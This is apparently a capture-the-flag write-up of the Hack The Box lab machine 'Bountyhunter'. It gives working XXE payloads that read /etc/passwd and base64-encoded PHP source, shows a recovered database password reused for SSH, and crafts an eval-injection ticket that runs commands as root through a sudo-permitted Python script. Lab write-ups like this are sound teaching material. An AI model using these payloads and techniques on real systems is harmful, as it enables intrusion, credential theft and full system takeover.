---
layout: post
author: jseals
title: "Bountyhunter: Hack The Box Walk-through"
image: htb-bountyhunter/bountyhunter.png
---

## Background

Bountyhunter is a "vulnerable by design" machine created by [ejedev][1] and hosted at [hackthebox.eu][2]. In this walk-through I perform the actions of an attacker. The goals are to get user-level privileges on the victim machine (get the flag in /home/$USER/user.txt) and escalate privileges to root (get the flag in /root/root.txt).

## Victim Machine Specs
![bountyhunter.png](/assets/images/posts/htb-bountyhunter/bountyhunter.png)

## Reconnaissance
As usual, we start off with an nmap scan to see what ports are open and what services we can ID if any:
```text
[bountyhunter] λ sudo nmap -sV -sC -oA nmap/bountyhunter -v bountyhunter.htb

Starting Nmap 7.92 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:34
Completed NSE at 11:34, 0.00s elapsed
Initiating NSE at 11:34
Completed NSE at 11:34, 0.00s elapsed
Initiating NSE at 11:34
Completed NSE at 11:34, 0.00s elapsed
Initiating Ping Scan at 11:34
Scanning bountyhunter.htb (23.221.222.250) [4 ports]
Completed Ping Scan at 11:34, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:34
Completed Parallel DNS resolution of 1 host. at 11:34, 0.01s elapsed
Initiating SYN Stealth Scan at 11:34
Scanning bountyhunter.htb (23.221.222.250) [1000 ports]
Discovered open port 80/tcp on 23.221.222.250
Completed SYN Stealth Scan at 11:34, 6.76s elapsed (1000 total ports)
Initiating Service scan at 11:34
Scanning 1 service on bountyhunter.htb (23.221.222.250)
Completed Service scan at 11:36, 87.42s elapsed (1 service on 1 host)
NSE: Script scanning 23.221.222.250.
Initiating NSE at 11:36
Completed NSE at 11:36, 1.71s elapsed
Initiating NSE at 11:36
Completed NSE at 11:36, 1.05s elapsed
Initiating NSE at 11:36
Completed NSE at 11:36, 0.00s elapsed
Nmap scan report for bountyhunter.htb (23.221.222.250)
Host is up (0.071s latency).
rDNS record for 23.221.222.250: a23-221-222-250.deploy.static.akamaitechnologies.com
Not shown: 987 filtered tcp ports (no-response), 11 filtered tcp ports (port-unreach)
PORT     STATE  SERVICE         VERSION
80/tcp   open   htt
8082/tcp closed blackice-alerts
```

## Enumeration
We can start by browsing the http website in our browser that's proxied through burp. We're first greeted with the home page:
![http-home-page.png](/assets/images/posts/htb-bountyhunter/http-home-page.png)

Looking around, many of the links go nowhere, but the portal link looks to take us to /portal.php which looks like this:
![http-portal.png](/assets/images/posts/htb-bountyhunter/http-portal.png)

We click the link to "test the bounty tracker":
![log_submit.png](/assets/images/posts/htb-bountyhunter/log_submit.png)

Let's enter some test data and submit it to see what it looks like in burp:
![report-submit.png](/assets/images/posts/htb-bountyhunter/report-submit.png)

Simple enough, it just outputs our data, how does it look in burp:
![report-submit-burp.png](/assets/images/posts/htb-bountyhunter/report-submit-burp.png)

We see a strange url path, "/tracker_diRbPr00f314.php", and it seems to be sending a base64 encoded payload in the data parameter of the POST request. That value decoded is:
```text
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>title</title>
		<cwe>cwe</cwe>
		<cvss>cvss</cvss>
		<reward>bounty</reward>
		</bugreport>
```

## Foothold

So it seems the POST request takes our data and submits it to the backend as XML. Maybe we're looking at some XML / XXE injection? To test the theory, let's try the XXE injection by changing the data value to this:
```text
data=<?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE data [
    <!ENTITY payload SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>title</title>
		<cwe>cwe</cwe>
		<cvss>cvss</cvss>
		<reward>&payload;</reward>
		</bugreport>
```

We've added an entity to retrieve /etc/passwd and it should render the contents of that file in the reward tags. We base64 encode, then URL encode the entire payload, and send it through burp:
![xxe-inject-success.png](/assets/images/posts/htb-bountyhunter/xxe-inject-success.png)

We can see in the returned response the contents of /etc/passwd, great. We see a user account named development. We also had a gobuster directory scan running in the background:
```text
[bountyhunter] λ gobuster dir -w ~/code/github.com/SecLists/Discovery/Web-Content/raft-medium-directories.txt -x php -u http://bountyhunter.htb

/css                  (Status: 301) [Size: 318] [--> http://bountyhunter.htb/css/]
/assets               (Status: 301) [Size: 321] [--> http://bountyhunter.htb/assets/]
/js                   (Status: 301) [Size: 317] [--> http://bountyhunter.htb/js/]
/db.php               (Status: 200) [Size: 0]
/resources            (Status: 301) [Size: 324] [--> http://bountyhunter.htb/resources/]
/index.php            (Status: 200) [Size: 25169]
/portal.php           (Status: 200) [Size: 125]
```

It found a "db.php" file. We can try to use the injection vector to perform LFI on that file. Here's how our new payload looks like:
```text
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY payload SYSTEM "php://filter/read=convert.base64-
encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>title</title>
 <cwe>cwe</cwe>
 <cvss>cvss</cvss>
 <reward>&payload;</reward>
</bugreport>
```

Similar to before, but we need to use the php filter, otherwise it will try to render the php file instead of showing us the contents. We base64 encode it, then URL encode it and send it off with burp:
![xxe-inject-success.png](/assets/images/posts/htb-bountyhunter/xxe-inject-db-php.png)

Since we php filtered it using base64, we need to decode the response:
```text
[bountyhunter] λ echo -n "PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo" |base64 -d
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
base64: invalid input
```

## Privilege Escalation to User

We get some db credentials. Anytime a password is found, it's worth trying to to login to other services using that password. Even security driven people reuse passwords. Let's try ssh using the development user we found and this password:
```text
[bountyhunter] λ ssh development@bountyhunter.htb
The authenticity of host 'bountyhunter.htb (10.129.204.162)' can't be established.
ECDSA key fingerprint is SHA256:3IaCMSdNq0Q9iu+vTawqvIf84OO0+RYNnsDxDBZI04Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'bountyhunter.htb,10.129.204.162' (ECDSA) to the list of known hosts.
development@bountyhunter.htb's password:
development@bountyhunter:~$
```

We officially have user-level access to the machine, here's the flag:
```text
development@bountyhunter:~$ whoami
development
development@bountyhunter:~$ cat user.txt
4d91daa2e1656ca96--truncated--
```

## Privilege Escalation to Root User

With user access, the last step is to escalate our privileges to root / complete privileges over the machine.

Along with the user flag file, there is a contract.txt in development's home directory:
```text
development@bountyhunter:~$ ls
contract.txt  user.txt
development@bountyhunter:~$ cat contract.txt
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc getscompleted.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful oftickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

Looks like a hint for us. Let's see if the development user can run anything as root with sudo:
```text
development@bountyhunter:/opt/skytrain_inc$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

This matches up with the contract text we found. The directory contains the script and an invalid_tickets directory:

```text
development@bountyhunter:/opt/skytrain_inc$ ls
invalid_tickets  ticketValidator.py
```

The python script:
```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

The first thing that stands out is the eval. That combined with the fact we can run this as root could be our path forward to root. Okay, so what we need to do is craft a valid ticket for the script to read and try to include some of our own code inside the eval function that gets called. There are a few requirements for the ticket format that must be met in order to reach the code branch that gets us to eval():

1. The file must end in ".md"
2. The first line must be "# Skytrain Inc"
3. The second line must be "## Ticket to 'anything here'"
4. The third line must be " _ _Ticket Code:_ _"
5. Lastly, the fourth line must start with "**", and then followed by a number greater than 100 and also has a modulo of 4 when divided by 7.

Simple code to generate valid numbers:
```python
In [1]: for x in range(101,1001):
   ...:     if x % 7 == 4:
   ...:         print(x)
```

It gives us many, let's pick 186 as our number. There's one last trick, since we are executing inside an eval function, we must perform some simple calculation with our magic number first, then we can use the and condition to execute the python of our choosing (as the root user with sudo).

Given all this, here's our crafted ticket payload to test:
```text
development@bountyhunter:/tmp$ cat payload.md
# Skytrain Inc
## Ticket to pwntown
__Ticket Code:__
**186+1==187 and __import__('os').system('whoami') == True
```

We hit all the requirements and our magic number and whoami commands are evaluated as conditions which is required since we're inside eval(). Let's run the ticketValidator.py with sudo and pass in our ticket:
```text
development@bountyhunter:/opt/skytrain_inc$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/payload.md
Destination: pwntown
root
```

The whoami command is executed and it returns root. The code injection test is successful. Let's refactor the ticket to cat our root flag:
```text
development@bountyhunter:/tmp$ cat payload.md
# Skytrain Inc
## Ticket to pwntown
__Ticket Code:__
**186+1==187 and __import__('os').system('cat /root/root.txt') == True
```
Rerun the ticket validator script:
```text
development@bountyhunter:/opt/skytrain_inc$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/payload.md
Destination: pwntown
e2c32dfa78e8b578d628c---truncated
```

We retrieve the root flag which proves root access. That wraps up this machine.

[1]: https://app.hackthebox.com/users/280547
[2]: https://www.hackthebox.eu